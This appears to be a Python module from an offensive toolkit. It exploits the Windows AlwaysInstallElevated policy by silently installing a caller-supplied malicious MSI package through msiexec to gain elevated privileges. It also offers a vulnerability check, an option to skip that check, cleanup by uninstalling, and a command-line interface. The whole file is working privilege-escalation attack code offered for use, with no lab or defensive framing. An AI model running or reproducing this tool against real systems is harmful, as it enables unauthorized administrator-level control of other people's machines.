import os
import subprocess
import time
from typing import Tuple, Optional
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from base import AIEExploitBase
from checker import RegistryChecker


class MSIExploiter(AIEExploitBase):
    """Exploit AlwaysInstallElevated via MSI installation."""

    def __init__(self, output_dir: str = "msi_exploits"):
        """
        Initialize the MSI exploiter.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__(output_dir)
        self.checker = RegistryChecker(output_dir)
        self.log("MSI Exploiter initialized", "SUCCESS")

    def verify_vulnerability(self) -> bool:
        """
        Verify the system is vulnerable before exploitation.

        Returns:
            True if vulnerable, False otherwise
        """
        return self.checker.is_vulnerable()

    def install_msi(self, msi_path: str, quiet: bool = True,
                    no_restart: bool = True) -> Tuple[bool, str]:
        """
        Install an MSI package.

        Args:
            msi_path: Path to the MSI file
            quiet: Install silently
            no_restart: Prevent system restart

        Returns:
            Tuple of (success, message)
        """
        self.log(f"Installing MSI: {msi_path}")

        # Verify MSI exists
        if not self.file_exists(msi_path):
            self.log(f"MSI file not found: {msi_path}", "ERROR")
            return False, "MSI file not found"

        # Get file size for logging
        size = self.get_file_size(msi_path)
        self.log(f"MSI size: {size} bytes")

        # Build msiexec command
        cmd_parts = ['msiexec']

        if quiet:
            cmd_parts.extend(['/quiet', '/qn'])

        cmd_parts.extend(['/i', f'"{msi_path}"'])

        if no_restart:
            cmd_parts.append('/norestart')

        cmd = ' '.join(cmd_parts)

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if result.returncode == 0:
                self.log("MSI installed successfully!", "SUCCESS")
                return True, "Installation successful"
            elif result.returncode == 1603:
                self.log("Installation failed - fatal error", "ERROR")
                return False, "Installation fatal error (1603)"
            elif result.returncode == 1618:
                self.log("Another installation in progress", "WARNING")
                return False, "Another installation in progress (1618)"
            elif result.returncode == 3010:
                self.log("Installation successful - restart required", "SUCCESS")
                return True, "Installation successful (restart required)"
            else:
                self.log(f"Installation returned code: {result.returncode}", "WARNING")
                return False, f"Unknown return code: {result.returncode}"

        except Exception as e:
            self.log(f"Installation failed: {e}", "ERROR")
            return False, str(e)

    def exploit(self, msi_path: str, verify_first: bool = True) -> Tuple[bool, str]:
        """
        Exploit AlwaysInstallElevated with a malicious MSI.

        Args:
            msi_path: Path to malicious MSI
            verify_first: Check vulnerability before exploiting

        Returns:
            Tuple of (success, message)
        """
        self.log("Starting AlwaysInstallElevated exploitation...")

        # Optional vulnerability check
        if verify_first:
            if not self.verify_vulnerability():
                self.log("System not vulnerable - aborting", "ERROR")
                return False, "System not vulnerable to AlwaysInstallElevated"

        # Install the MSI
        return self.install_msi(msi_path)

    def uninstall_msi(self, msi_path: str = None,
                      product_code: str = None) -> Tuple[bool, str]:
        """
        Uninstall an MSI package (cleanup).

        Args:
            msi_path: Path to the MSI file
            product_code: Product GUID (alternative to path)

        Returns:
            Tuple of (success, message)
        """
        if msi_path:
            cmd = f'msiexec /quiet /qn /x "{msi_path}"'
        elif product_code:
            cmd = f'msiexec /quiet /qn /x {product_code}'
        else:
            return False, "Must provide msi_path or product_code"

        self.log(f"Uninstalling: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if result.returncode == 0:
                self.log("Uninstallation successful", "SUCCESS")
                return True, "Uninstallation successful"
            else:
                self.log(f"Uninstallation returned: {result.returncode}", "WARNING")
                return False, f"Return code: {result.returncode}"

        except Exception as e:
            return False, str(e)

    def install_with_logging(self, msi_path: str) -> Tuple[bool, str]:
        """
        Install MSI with detailed logging for debugging.

        Args:
            msi_path: Path to the MSI file

        Returns:
            Tuple of (success, message)
        """
        log_path = self.output_dir / "msi_install.log"

        cmd = f'msiexec /i "{msi_path}" /quiet /qn /l*v "{log_path}"'

        self.log(f"Installing with logging to: {log_path}")
        self.log(f"Command: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)

            if result.returncode == 0:
                self.log("Installation successful", "SUCCESS")
                return True, f"Success - log at {log_path}"
            else:
                self.log(f"Installation failed - check log: {log_path}", "ERROR")
                return False, f"Failed - check log at {log_path}"

        except Exception as e:
            return False, str(e)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="MSI Exploiter")
    parser.add_argument('--install', '-i', type=str,
                        help='Path to MSI file to install')
    parser.add_argument('--uninstall', '-u', type=str,
                        help='Path to MSI file to uninstall')
    parser.add_argument('--no-verify', action='store_true',
                        help='Skip vulnerability verification')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose logging')

    args = parser.parse_args()

    exploiter = MSIExploiter()

    if args.install:
        success, msg = exploiter.exploit(
            args.install,
            verify_first=not args.no_verify
        )
        print(f"\n[{'SUCCESS' if success else 'FAILED'}] {msg}")

    elif args.uninstall:
        success, msg = exploiter.uninstall_msi(msi_path=args.uninstall)
        print(f"\n[{'SUCCESS' if success else 'FAILED'}] {msg}")

    else:
        parser.print_help()